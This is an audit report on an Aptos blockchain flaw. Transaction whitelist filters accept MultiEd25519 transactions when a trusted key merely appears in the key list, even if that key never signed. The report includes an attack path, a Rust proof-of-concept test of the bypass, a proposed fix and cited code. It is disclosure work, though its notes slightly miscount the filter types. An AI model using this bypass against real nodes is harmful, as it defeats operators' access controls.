# Audit Report

## Title
MultiEd25519 Whitelist Filter Bypass via Public Key Set Checking Instead of Signature Bitmap Verification

## Summary
The transaction filter logic for MultiEd25519 authenticators checks if a target public key exists in the account's public key list, but fails to verify whether that key was actually used to sign the transaction. This allows attackers to bypass whitelist-based filters by including trusted keys in their MultiEd25519 configuration while signing with untrusted keys they control.

## Finding Description
The vulnerability exists in the `matches_account_authenticator_public_key()` function for MultiEd25519 authenticators. [1](#0-0) 

The function checks if ANY public key in the MultiEd25519 public key list matches the target key, but completely ignores the signature field which contains the bitmap indicating which keys actually signed.

**MultiEd25519 Structure Context:**
The MultiEd25519Signature contains a bitmap that indicates which specific keys from the public key list were used to sign. [2](#0-1) 

**Attack Path:**
1. Attacker creates a MultiEd25519 account with public keys: `[trusted_key_A, attacker_key_B]` and threshold=1
2. Node operator configures whitelist filter: ALLOW transactions signed by `trusted_key_A`, DENY all others
3. Attacker submits transaction signed ONLY with `attacker_key_B` (bitmap indicates only position 1 signed)
4. Filter checks via `matches_account_authenticator_public_key()`: "Is `trusted_key_A` in the public key list?" → YES
5. Transaction is ALLOWED by the filter (bypass occurs here)
6. Signature verification checks: "Is threshold met with valid signatures?" → YES (attacker_key_B is valid)
7. Transaction executes successfully despite `trusted_key_A` never signing

The filter is used in production across multiple layers: [3](#0-2) 

The TransactionAuthenticator and AccountAuthenticator enums confirm the MultiEd25519 variant has both public_key and signature fields: [4](#0-3) 

**Broken Invariant:**
This violates the **Access Control** and **Transaction Validation** invariants. Whitelist filters are designed to enforce that only transactions authorized by specific trusted keys can pass, but an attacker can include trusted keys in their MultiEd25519 configuration without actually needing those keys to sign.

## Impact Explanation
This is a **High Severity** vulnerability per the Aptos bug bounty criteria, qualifying as a "Significant protocol violation."

**Concrete Impacts:**
1. **Access Control Bypass**: Validators or API nodes using whitelist filters to restrict transactions to trusted signers can be bypassed
2. **Rate Limiting Bypass**: If public key filters are used for rate limiting or prioritization, attackers can gain unfair advantages
3. **Consensus Layer Risk**: The consensus filter can be bypassed, potentially allowing denial-of-service through filtered transaction types
4. **Multi-Layer Exploitation**: Affects mempool, consensus, and API filtering simultaneously

The vulnerability doesn't directly lead to fund loss or consensus safety violations, placing it in the High (not Critical) category. However, it represents a significant security control failure that undermines trust-based filtering mechanisms.

## Likelihood Explanation
**Likelihood: High**

The attack is:
- **Easy to execute**: Creating a MultiEd25519 account is standard functionality
- **Low cost**: No special resources or validator access required
- **Difficult to detect**: The transaction appears legitimate to filters
- **Broadly applicable**: Any system using public key whitelisting is vulnerable

**Attacker Requirements:**
- Ability to create a MultiEd25519 account (trivial)
- Knowledge of a trusted public key to include (may be public information)
- Standard transaction submission capabilities

**Practical Scenarios:**
- Validator nodes filtering transactions for governance or system operations
- API nodes implementing access control based on public keys
- Consensus filters rejecting certain transaction types from untrusted sources

## Recommendation
The fix must check which keys were actually used to sign, not just which keys are present in the public key list.

**Recommended Fix:**

Modify the `matches_account_authenticator_public_key()` function to check the signature bitmap for MultiEd25519:

```rust
AccountAuthenticator::MultiEd25519 { public_key, signature } => {
    // Get the bitmap from the signature to determine which keys actually signed
    let bitmap = signature.bitmap();
    
    // Only check keys that were actually used for signing (bitmap bit is set)
    public_key.public_keys()
        .iter()
        .enumerate()
        .any(|(index, ed25519_public_key)| {
            // Check if this key position was used in the signature
            bitmap_get_bit(bitmap, index) && 
            compare_ed25519_public_key(ed25519_public_key, any_public_key)
        })
}
```

**Alternative Consideration:**
Document clearly that public key filters check key membership, not key usage, and recommend using sender address filters instead for access control. However, this doesn't fix the security issue for existing deployments.

## Proof of Concept

```rust
#[cfg(test)]
mod test_multied25519_filter_bypass {
    use super::*;
    use aptos_crypto::{
        ed25519::Ed25519PrivateKey,
        multi_ed25519::{MultiEd25519PublicKey, MultiEd25519Signature},
        PrivateKey, SigningKey, Uniform,
    };
    use aptos_types::{
        chain_id::ChainId,
        transaction::{RawTransaction, Script, SignedTransaction, TransactionPayload},
    };
    use move_core_types::account_address::AccountAddress;
    use rand::thread_rng;

    #[test]
    fn test_multied25519_whitelist_bypass() {
        // Step 1: Generate two key pairs
        let trusted_private_key = Ed25519PrivateKey::generate(&mut thread_rng());
        let trusted_public_key = trusted_private_key.public_key();
        
        let attacker_private_key = Ed25519PrivateKey::generate(&mut thread_rng());
        let attacker_public_key = attacker_private_key.public_key();

        // Step 2: Create MultiEd25519 with [trusted_key, attacker_key], threshold=1
        let multi_public_key = MultiEd25519PublicKey::new(
            vec![trusted_public_key.clone(), attacker_public_key.clone()],
            1, // Only need 1 signature
        ).unwrap();

        // Step 3: Create transaction and sign with ONLY attacker key (not trusted key)
        let raw_transaction = RawTransaction::new(
            AccountAddress::random(),
            0,
            TransactionPayload::Script(Script::new(vec![], vec![], vec![])),
            0,
            0,
            0,
            ChainId::new(10),
        );

        // Sign with only the attacker key (index 1 in the key list)
        let attacker_signature = attacker_private_key.sign(&raw_transaction).unwrap();
        
        // Create MultiEd25519 signature with bitmap indicating only index 1 signed
        let multi_signature = MultiEd25519Signature::new(
            vec![attacker_signature],
            [0b0100_0000u8, 0u8, 0u8, 0u8], // Bit 1 set (second key)
        ).unwrap();

        let signed_transaction = SignedTransaction::new_multisig(
            raw_transaction,
            multi_public_key,
            multi_signature,
        );

        // Step 4: Create whitelist filter for trusted_public_key ONLY
        let filter = TransactionFilter::empty()
            .add_public_key_filter(true, AnyPublicKey::ed25519(trusted_public_key))
            .add_all_filter(false); // Deny everything else

        // Step 5: VULNERABILITY - Filter allows transaction even though trusted key didn't sign!
        assert!(filter.allows_transaction(&signed_transaction), 
            "VULNERABILITY: Transaction passes whitelist filter even though trusted key never signed!");
        
        // The attacker successfully bypassed the whitelist by including the trusted key
        // in the MultiEd25519 public key list without actually needing it to sign.
    }
}
```

**Notes:**
This vulnerability affects all three filter types configured in the system: mempool_filter, consensus_filter, and api_filter. [5](#0-4) 

The issue is particularly severe because the signature bitmap information is available at filter time but simply ignored. The MultiEd25519 signature verification logic correctly uses the bitmap. [6](#0-5)

### Citations

**File:** crates/aptos-transaction-filters/src/transaction_filter.rs (L295-298)
```rust
        AccountAuthenticator::MultiEd25519 { public_key, .. } => {
            public_key.public_keys().iter().any(|ed25519_public_key| {
                compare_ed25519_public_key(ed25519_public_key, any_public_key)
            })
```

**File:** crates/aptos-crypto/src/multi_ed25519.rs (L52-55)
```rust
pub struct MultiEd25519Signature {
    signatures: Vec<Ed25519Signature>,
    bitmap: [u8; BITMAP_NUM_OF_BYTES],
}
```

**File:** crates/aptos-crypto/src/multi_ed25519.rs (L527-535)
```rust
        let num_ones_in_bitmap = bitmap_count_ones(self.bitmap);
        if num_ones_in_bitmap < public_key.threshold as u32 {
            return Err(anyhow!(
                "{}",
                CryptoMaterialError::BitVecError(
                    "Not enough signatures to meet the threshold".to_string()
                )
            ));
        }
```

**File:** mempool/src/shared_mempool/tasks.rs (L408-466)
```rust
fn filter_transactions(
    transaction_filter_config: &TransactionFilterConfig,
    transactions: Vec<(
        SignedTransaction,
        Option<u64>,
        Option<BroadcastPeerPriority>,
    )>,
    statuses: &mut Vec<(SignedTransaction, (MempoolStatus, Option<StatusCode>))>,
) -> Vec<(
    SignedTransaction,
    Option<u64>,
    Option<BroadcastPeerPriority>,
)> {
    // If the filter is not enabled, return early
    if !transaction_filter_config.is_enabled() {
        return transactions;
    }

    // Start the filter processing timer
    let transaction_filter_timer = counters::PROCESS_TXN_BREAKDOWN_LATENCY
        .with_label_values(&[counters::FILTER_TRANSACTIONS_LABEL])
        .start_timer();

    // Filter the transactions and update the statuses accordingly
    let transactions = transactions
        .into_iter()
        .filter_map(|(transaction, account_sequence_number, priority)| {
            if transaction_filter_config
                .transaction_filter()
                .allows_transaction(&transaction)
            {
                Some((transaction, account_sequence_number, priority))
            } else {
                info!(LogSchema::event_log(
                    LogEntry::TransactionFilter,
                    LogEvent::TransactionRejected
                )
                .message(&format!(
                    "Transaction {} rejected by filter",
                    transaction.committed_hash()
                )));

                statuses.push((
                    transaction.clone(),
                    (
                        MempoolStatus::new(MempoolStatusCode::RejectedByFilter),
                        None,
                    ),
                ));
                None
            }
        })
        .collect();

    // Update the filter processing latency metrics
    transaction_filter_timer.stop_and_record();

    transactions
}
```

**File:** types/src/transaction/authenticator.rs (L532-535)
```rust
    MultiEd25519 {
        public_key: MultiEd25519PublicKey,
        signature: MultiEd25519Signature,
    },
```

**File:** config/src/config/transaction_filters_config.rs (L10-18)
```rust
#[derive(Clone, Debug, Default, Deserialize, PartialEq, Eq, Serialize)]
#[serde(default, deny_unknown_fields)]
pub struct TransactionFiltersConfig {
    pub api_filter: TransactionFilterConfig, // Filter for the API (e.g., txn simulation)
    pub consensus_filter: BlockTransactionFilterConfig, // Filter for consensus (e.g., proposal voting)
    pub execution_filter: BlockTransactionFilterConfig, // Filter for execution (e.g., block execution)
    pub mempool_filter: TransactionFilterConfig,        // Filter for mempool (e.g., txn submission)
    pub quorum_store_filter: BatchTransactionFilterConfig, // Filter for quorum store (e.g., batch voting)
}
```
